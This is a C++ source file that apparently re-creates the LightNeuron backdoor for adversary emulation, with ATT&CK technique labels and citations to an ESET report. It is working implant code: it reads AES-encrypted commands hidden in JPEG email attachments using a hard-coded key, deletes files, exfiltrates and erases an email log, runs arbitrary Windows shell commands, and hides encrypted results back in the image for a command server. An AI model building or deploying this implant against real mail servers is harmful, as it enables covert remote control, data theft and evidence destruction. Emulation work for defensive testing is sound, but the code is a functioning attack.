#include "stego.h"
#include "base64.h"
#include <stdio.h>
#include <windows.h>
#include <string>
#include <exception>
#include <assert.h>
#include <iomanip>


// AES KEY
// CTI Note: AES key was hard coded in the application
// Reference: https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf

CryptoPP::byte aes_key[] = { 0x74, 0x68, 0x69, 0x73, 0x69, 0x73, 0x33, 0x32, 0x62, 0x69, 0x74, 0x6c, 0x6f, 0x6e, 0x67, 0x70, 0x61, 0x73, 0x73, 0x70, 0x68, 0x72, 0x61, 0x73, 0x65, 0x69, 0x6d, 0x75, 0x73, 0x69, 0x6e, 0x67 };


/*
 * GenerateIv
 *     About:
 *         generates a random IV based on block size
 *         USed for the AES encryption function
 *     Result:
 *         If successful, a randombyte array will be generate based on block size
 *     MITRE ATT&CK Techniques:
 *         T1573.001: Encrypted Channel: Symmetric Encryption
 *     Reference:
 *         https://cryptopp.com/wiki/Initialization_Vector
 */
std::vector<CryptoPP::byte> GenerateIv(size_t size) {
    CryptoPP::AutoSeededRandomPool prng;

    // Generate IV
    std::vector<CryptoPP::byte> iv = std::vector<CryptoPP::byte>(size);
    prng.GenerateBlock(&iv[0], size);
    return iv;
}


/*
 * AES256Encrypt
 *     About:
 *         takes in plain text data and encrpyts using a hard coded aes key (AES 256 CFB)
 *     Result:
 *         If successful, the IV and cipher text will be returned
 *     MITRE ATT&CK Techniques:
 *         T1573.001: Encrypted Channel: Symmetric Encryption
 *     Reference:
 *         https://www.cryptopp.com/wiki/Block_Cipher
 */
std::vector<char> AES256Encrypt(std::vector<char> plaintext) {

    // Verify provided key size
    if (sizeof(aes_key) != CryptoPP::AES::MAX_KEYLENGTH) {
        throw std::runtime_error("Invalid key size.");
    }

    // Set key and IV.
    CryptoPP::byte iv_bytes[CryptoPP::AES::BLOCKSIZE];

    std::vector<CryptoPP::byte> iv = GenerateIv(CryptoPP::AES::BLOCKSIZE);

    std::memcpy(iv_bytes, &iv[0], CryptoPP::AES::BLOCKSIZE);

    // Buffer for ciphertext
    std::string ciphertext;
    ciphertext.reserve((CryptoPP::AES::BLOCKSIZE * 2) + plaintext.size());

    // Encrypt
    CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption AES_encryptor(aes_key, sizeof(aes_key), iv_bytes);
    CryptoPP::StringSource(std::string(plaintext.begin(), plaintext.end()), true,
        new CryptoPP::StreamTransformationFilter(AES_encryptor,
            new CryptoPP::StringSink(ciphertext)
        )
    );

    // Prepend IV to ciphertext
    size_t combined_size = CryptoPP::AES::BLOCKSIZE;
    std::vector<char> iv_and_ciphertext = std::vector<char>(combined_size);
    for (int i = 0; i < CryptoPP::AES::BLOCKSIZE; i++) {
        iv_and_ciphertext[i] = (char)iv_bytes[i];
    }
    iv_and_ciphertext.insert(iv_and_ciphertext.begin() + CryptoPP::AES::BLOCKSIZE, ciphertext.begin(), ciphertext.end());
    return iv_and_ciphertext;
}


/*
 * AES256Decrypt
 *     About:
 *         takes in cipher text and uses the hardcoded AES key to decrypt (AES 256 CFB)
 *     Result:
 *         If sucessful the data will be decrypted and plaintext container data will be returned
 *     MITRE ATT&CK Techniques:
 *         T1573.001: Encrypted Channel: Symmetric Encryption
 *     Reference:
 *         https://www.cryptopp.com/wiki/Block_Cipher
 */
std::vector<unsigned char> AES256Decrypt(std::vector<unsigned char> ciphertext) {

    // Verify provided key size
    if (sizeof(aes_key) != CryptoPP::AES::MAX_KEYLENGTH) {
        throw std::runtime_error("Invalid key size.");
    }

    // Set key and IV. 
    CryptoPP::byte iv_bytes[CryptoPP::AES::BLOCKSIZE];
    std::memcpy(iv_bytes, &ciphertext[0], CryptoPP::AES::BLOCKSIZE);

    // Buffer for plaintext
    std::string plaintext;
    plaintext.reserve(ciphertext.size());

    // Decrypt
    CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption AES_decryptor(aes_key, sizeof(aes_key), iv_bytes);
    CryptoPP::StringSource(std::string(ciphertext.begin() + CryptoPP::AES::BLOCKSIZE, ciphertext.end()), true,
        new CryptoPP::StreamTransformationFilter(AES_decryptor,
            new CryptoPP::StringSink(plaintext)
        )
    );
    std::vector<char> _decryptedContainer = std::vector<char>(plaintext.begin(), plaintext.end());
  
   

    return reinterpret_cast<std::vector<unsigned char>&>(_decryptedContainer);
}

/// <summary>
/// Used to check the signature of the jpeg and determine if it should be further analyzed
///
/// input: A vector that contains the values we are analyzing
/// signature: The signature that we are checking against (Will be impimented when combined with companion dll)
///
/// returns: True if signature matches
/// </summary>
bool checkSignature(std::vector<unsigned char>& input, std::string signature1) {
    unsigned char* signature = reinterpret_cast<unsigned char*>(const_cast<char*>(signature1.c_str()));

    unsigned char custom_signature[8];
    for (int i = 0; i < 4; i++) {
        custom_signature[i] = input[i + 4 + 2] ^ input[i + 2];
    }

    for (int i = 0; i < 4; i++) {
        custom_signature[i + 4] = input[i + 10 + 2] ^ input[i + 2];
    }

    for (int x = 0; x < 8; x++) {
        if (custom_signature[x] != signature[x]) {
            return false;
        }
    }
    return true;
}


/// <summary>
/// Converts an int into a 4-byte char array in hex format
///
/// n: Integer to convert
/// bytes: Array that will hold the new format
/// </summary>
void intToBytes(unsigned int n, unsigned char bytes[]) {
    bytes[0] = (n >> 24) & 0xFF;
    bytes[1] = (n >> 16) & 0xFF;
    bytes[2] = (n >> 8) & 0xFF;
    bytes[3] = (n) & 0xFF;
}



/*
 * embed
 *     About:
 *         Embeds data back into the image
 *         Used after analyzing jpg and getting the needed output
 *     Result:
 *         If successful, data is embedded back into the same image, in a format the C2 can extract it
 *     MITRE ATT&CK Techniques:
 *         T1001.002: Data Obfuscation: Steganography
 *     CTI:
 *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=24
 */
bool embed(std::vector<unsigned char> &data, int offset, std::vector<unsigned char> outputData, int length) {
    unsigned char lengthBytes[4];
    intToBytes(length, lengthBytes);

    // Write the length of the data to the file
    for (int i = 0; i < 4; i++) {
        data[offset + i] = lengthBytes[i];
    }
    offset += 4;

    // Write the output data to the file
    for (int i = 0; i < length; i++) {
        data.insert(data.begin() + offset + i, (unsigned char)outputData[i]);
    }

    return true;
}

/*
 * executeContainer
 *     About:
 *         Execute any commands that are embedded in the received image file
 *     Result:
 *         Returns the result of the command so that it can be embedded back into the image
 *     MITRE ATT&CK Techniques:
 *         T1005: Data from Local System
 *         T1059.003: Command and Scripting Interpreter: Windows Command Shell
 *         T1070.004: Indicator Removal on Host: File Deletion
 *     CTI:
 *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=23
 */
std::string executeContainer(container container, std::string log_file) {
    std::string result = "";
    command command = container.commands;

    switch (container.CmdID) {
        //Delete a file
    case 2:
    {
        if (remove(command.fp.c_str()) != 0) {
            result = "Could not delete file: " + command.fp;
        }
        else {
            result = "Successfully deleted file: " + command.fp;
        }
        break;
    }
    //Exfiltrate a file
    case 3:
    {
        bool deleteFlag = false;

        if (command.fp == "1") {
            //Delete the file after exfiltrating
            deleteFlag = true;
        }
        std::string emailLogFilePath = log_file;

        std::ifstream inputFile(emailLogFilePath);
        if (!inputFile.is_open()) {
            result += ("Could not read file: " + emailLogFilePath);
        }
        else {
            result += std::string((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
        }

        inputFile.close();

        if (deleteFlag) {
            if (remove(emailLogFilePath.c_str()) != 0) {
                result += "\nCould not delete email log file.";
            }
            else {
                result += "\nSuccessfully deleted email log file.";
            }
        }
        break;
    }
    //Execute a command line
    case 5:
    {
        // Size of buffer to write into
        int BUFF_SIZE = 128;

        // call cmd to run the command
        std::string cmdString = "cmd /C ";

        // Append the command that was sent by the C2
        cmdString += command.fp;

        // Convert cmd to char* so pipe cna use it
        const char* cmd = cmdString.c_str();

        // Buffer to hold data read in from pipe
        char* buff = new char[BUFF_SIZE];
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);

        // Loop through the pipe output and append to result
        while (fgets(buff, BUFF_SIZE, pipe.get()) != nullptr) {
            result += buff;
        }
        break;
    }
    }

    return result;
}

/// <summary>
/// Used to extract data from the image file 
/// It also controls the exectuion of that data 
///
/// data: Reference to image data
/// offset: Location to start extracting data from the image
/// log_file: path to email log file
///
/// returns: True if successfully extracted data
/// </summary>
std::string extract(std::vector<unsigned char>& data, int offset, std::string log_file) {
    container container;
    int containerSize = getSectionLength(data, 4, offset);
    std::vector <unsigned char> containerVector(containerSize - 4);
    std::vector<char>& _containerVector = reinterpret_cast<std::vector <char>&>(containerVector);

    // Load with the container data (needed so that text cna be decrypted)
    offset += 4;

    for (int i = 0; i < containerSize - 4; i++) {
        containerVector[i] = data[offset + i];
        //cipher[i] = data[offset+i];
    }

    //aes_decrypt
    std::vector<unsigned char> decryptedContainer = AES256Decrypt(containerVector);

    int containerOffset = 0;
    container.CmdID = getSectionLength(decryptedContainer, 4, containerOffset);
    containerOffset += 4;
    container.rcptl = getSectionLength(decryptedContainer, 4, containerOffset);
    containerOffset += 4;
    container.rcpt = getArgument(decryptedContainer, containerOffset, container.rcptl);
    containerOffset += container.rcptl;

    command command;


    switch (container.CmdID) {
    case 2:
    {
        //Delete a file
        command.InstrCode = 2;
        command.fpl = getSectionLength(decryptedContainer, 4, containerOffset);
        containerOffset += 4;
        command.fp = getArgument(decryptedContainer, containerOffset, command.fpl);
        containerOffset += command.fpl;

        std::cout << "Delete a file" << std::endl;
        break;
    }
    case 3:
    {
        bool deleteFlag = false;

        //Exfiltrate a file
        command.InstrCode = 3;
        command.fpl = getSectionLength(decryptedContainer, 4, containerOffset);
        containerOffset += 4;
        command.fp = getArgument(decryptedContainer, containerOffset, command.fpl);
        containerOffset += command.fpl;
        break;
    }
    case 5:
    {
        //Execute a command line
        command.InstrCode = 5;
        command.fpl = getSectionLength(decryptedContainer, 4, containerOffset);
        containerOffset += 4;
        command.fp = getArgument(decryptedContainer, containerOffset, command.fpl);
        containerOffset += command.fpl;

        std::cout << "Execute a command line" << std::endl;
        break;
    }
    }
    container.commands = command;
    return executeContainer(container, log_file);
}


/// <summary>
/// Used to extract an argument string from the image file
///
/// data: Reference to the image data
/// offset: Location to extract data from the image
/// length: The length of the string to extract
///
/// returns: String from the image file at offset with length size
/// </summary>
std::string getArgument(std::vector<unsigned char>& data, int offset, int length) {
    return std::string(data.begin() + offset, data.begin() + offset + length);
}


/// <summary>
/// Gets the length of the next section of the image
/// Used to both skip sections and get the length of data we need to extract
///
/// data: Reference to the image data
/// length: How many bytes to extract to get the length (either 2 or 4)
/// offset: Where to start extracting data from image
///
/// returns: Length of the next section
/// </summary>
int getSectionLength(std::vector<unsigned char>& data, int length, int offset) {
    std::stringstream stream;

    for (int i = offset; i < length + offset; i++) {
        stream << std::hex << int(data[i]);
    }
    return stoi(stream.str(), 0, 16);
}

std::vector<unsigned char> substring(std::vector<unsigned char>& data, int offset, int length) {
    auto first = data.begin() + offset;
    auto last = data.begin() + offset + length + 1;

    return std::vector<unsigned char>(first, last);
}


/*
 * analyzeJPG
 *     About:
 *         Main function used to control steganography of attachments
 *         Loops through the jpg and calls the signature, extraction, and embedding functions
 *         Decodes and Encodes attachments in base64
 *     Result:
 *         Any commands embedded in the attachment are run
 *         Any output from the commands is embedded into the returned attachment
 *     MITRE ATT&CK Techniques:
 *         T1001.002: Data Obfuscation: Steganography
 *         T1132.001: Data Encoding: Standard Encoding
 *         T1140: Deobfuscate/Decode Files or Information
 *     CTI:
 *         https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=22
 */
bool analyzeJPG(char* &attachment, std::string sig, std::string log_file) {
    long long unsigned int tmp_offset = 0;
    int sectionLength;
    bool sigFlag = false; //Flag to check if the signature matches, if true email has command data
    bool updatedImage = false;

    std::vector<unsigned char> file;
    file = base64_decode(std::string(attachment)); //Decode the image


    bool quantizationFlag = false;

    for (tmp_offset; tmp_offset < file.size(); tmp_offset += 1) {
        // Check for quantization table 0xFFDB
        if (file[tmp_offset] == 255 && file[tmp_offset + 1] == 219) {
            if (quantizationFlag) {
                //Found second+ quantization section, get length and skip
                tmp_offset += 2; //Move to the length bytes
                sectionLength = getSectionLength(file, 2, tmp_offset);
                tmp_offset += sectionLength;
            }
            else {
                quantizationFlag = true;
                tmp_offset += 2; //Skip to important bytes

                std::vector<unsigned char> signature = substring(file, tmp_offset, 16);

                if (checkSignature(signature, sig)) {
                    sigFlag = true;
                }
                else {
                    break;
                }
            }
        }

        // Check for Start of Scan section 0xFFDA
        if (file[tmp_offset] == 255 && file[tmp_offset + 1] == 218) {
            //Found Start of Scan section
            tmp_offset += 2; //Move to the important bytes
            sectionLength = getSectionLength(file, 2, tmp_offset);
            tmp_offset += 2;



            //Check if we are looking at data in this image
            if (sigFlag) {
                std::cout << "Procesing container";

                std::string result;
                result = extract(file, tmp_offset, log_file);
                if (result != "NoOp") {
                    std::vector<char> _result;
                    std::copy(result.begin(), result.end(), std::back_inserter(_result));
                    std::vector <char> encrypted_result = AES256Encrypt(_result);
                    std::string enc_rs(encrypted_result.begin(), encrypted_result.end());
                    std::vector<unsigned char>& _encrypted_result = reinterpret_cast<std::vector <unsigned char>&>(encrypted_result);
                    embed(file, tmp_offset, _encrypted_result, enc_rs.length());
                    updatedImage = true;
                }

                sigFlag = false;
            }
        }


    }

    // Encode the image to be returned
    std::string encoded = base64_encode(reinterpret_cast<unsigned char*>(file.data()), file.size());
    attachment = (char*)malloc(encoded.size() + 1);
    memcpy(attachment, encoded.c_str(), encoded.size() + 1);
    return updatedImage; //True if we changed the image
}